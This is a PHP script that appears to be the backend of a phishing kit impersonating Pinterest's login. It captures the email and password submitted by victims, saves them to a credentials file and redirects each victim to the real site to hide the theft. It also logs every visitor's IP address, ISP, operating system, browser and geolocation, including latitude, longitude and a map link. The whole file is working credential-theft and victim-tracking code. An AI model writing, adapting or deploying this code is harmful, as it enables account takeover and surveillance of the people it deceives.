<?php
 $myfile2="Titanium_files/credentials/Pinterest/Ip.txt";
 $browser = $_SERVER['HTTP_USER_AGENT'];

    function get_ip($ipaddress,$isp,$ip,$isp2) {
        date_default_timezone_get();
        $date1= date("d/m/Y/h:i:sa");
        $date2 ="{DATE}:".$date1;
        global $myfile2;
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
            $ip = "{IP}:".$ipaddress;
            $isp = gethostbyaddr($_SERVER['HTTP_CLIENT_IP']);
            $isp2= preg_replace("/^[^.]+./", "{ISP}:",$isp);
            
        }
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {   //to check if ip is pass from proxy
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
            $ip = "{IP}:".$ipaddress;
            $isp = gethostbyaddr($_SERVER['HTTP_X_FORWARDED_FOR']);
            $isp2= preg_replace("/^[^.]+./", "{ISP}:",$isp);

        }
        else {
            $ipaddress = $_SERVER['HTTP_CF_CONNECTING_IP'];  // print the ip
            $ip = "{IP}:".$ipaddress;
            $isp = gethostbyaddr($_SERVER['HTTP_CF_CONNECTING_IP']);
            $isp2= preg_replace("/^[^.]+./", "{ISP}:",$isp);
        }
        $d = fopen($myfile2,"w");
        chmod($d, 0777);
        fwrite($d,$date2."\r\n");
        fwrite($d,$ip."\r\n");
        fwrite($d,$isp2."\r\n");
        /*GETTING IP DATA*/
        $query=@unserialize(file_get_contents("http://ip-api.com/php/{$ipaddress}"));
        
        if($query && $query["status"] == "success"){
            $Country ="{Country}:".$query["country"];
            $Timezone ="{Timezone}:".$query["timezone"];
            $Latidute ="{Geo_Latidute}:".$query["lat"];
            $Longitude ="{Geo_Longitude}:".$query["lon"];
            $Region ="{Region}:".$query["regionName"];
            $City ="{City}:".$query["city"];
            $link = "{Google-Maps-Link}:https://www.google.it/maps/place/{$query["lat"]},{$query["lon"]}";
            fwrite($d,$Country."\r\n");
            fwrite($d,$Timezone."\r\n");
            fwrite($d,$Region."\r\n");
            fwrite($d,$City."\r\n");
            fwrite($d,$Latidute."\r\n");
            fwrite($d,$Longitude."\r\n");
            fwrite($d,$link."\r\n");
            fclose($d);

        }
        else {
            $Error ="Sorry there is no Connection with the server";
            fwrite($d,$Error."\r\n");
            fclose($d);
        }
        
    }
    function get_os($vict_os,$os_datas) {
        global $browser;
        global $myfile2;
        $vict_os = "UNKNOWN";
        $os_datas = array (
            '/windows nt 10/i'      =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu-Linux',
            '/kali/i'               =>  'Kali-Linux',
            '/parrot/i'             =>  'Parrot-Linux',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile',
            
        );
        foreach($os_datas as $platform => $Value) {
            if (preg_match($platform,$browser)){
                $vict_os = "{OS_PLATFORM}:".$Value;
            }
        }
        $d = fopen($myfile2, "a+");
        fwrite($d,$vict_os."\r\n");
    }

    function get_agent($vict_browser,$browes_datas) {
        global $browser;
        global $myfile2;
        $vict_browser= "UNKNOWN";
        $browes_datas = array (
            '/firefox/i'    =>  'Firefox',
            '/chrome/i'     =>  'Chrome',
            '/edge/i'       =>  'Edge',
            '/safari/i'     =>  'Safari',
            '/netscape/i'   =>  'Netscape',
            '/msie|trident/i'=> 'Internet Explorer',
            '/tor/i'        =>  'Tor',
            '/konqueror/i'  =>  'Konqueror',

        );
        foreach($browes_datas as $datas => $Value){
            if(preg_match($datas,$browser)){
                $vict_browser = $Value;    
            }     
        }
        $d = fopen($myfile2, "a+");
        fwrite($d,"{BROWSER}:".$vict_browser);
    }

    function get_info($user,$currentuser){
        global $myfile2;
        $user = get_current_user();
        $currentuser ="{LOGGED AS}:". $user;
        $d = fopen($myfile2,"a+");
        fwrite($d,$currentuser."\r\n");

    }

    function get_creds($username,$password){
        $myfile="Titanium_files/credentials/Pinterest/Credentials.txt";
        $username=$_POST["email"];
        $password=$_POST["password"];
        header("location:https://pinterest.com/{$username}");  
        $d = fopen($myfile,"w");
        fwrite($d,"{USERNAME}:".$username."\r\n");
        fwrite($d,"{PASSWORD}:".$password."\r\n");
        fclose($d);
 
    }
 
    get_ip($ipaddress,$isp,$ip,$isp2);
    get_os($vict_os,$os_datas);
    get_info($user,$currentuser);
    get_agent($vict_browser, $browes_datas);
    
    if(isset($_POST["submit"])){
        
        get_creds($username,$password);
    }
     
 ?>
